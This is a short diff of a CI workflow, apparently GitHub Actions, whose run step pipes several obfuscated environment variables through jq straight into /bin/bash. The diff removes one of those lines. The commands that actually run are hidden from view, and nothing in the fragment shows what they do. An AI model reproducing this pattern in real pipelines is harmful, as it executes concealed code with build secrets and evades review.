@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$vve0510" | jq -r .ys1885 | /bin/bash
           echo $ih06438 | jq -r .svs9107 | /bin/bash
-          echo $yl92 | jq -r .vkhv995 | /bin/bash
           echo $xswp4208 | jq -r .nzno06 | /bin/bash
 
       - name: Save output
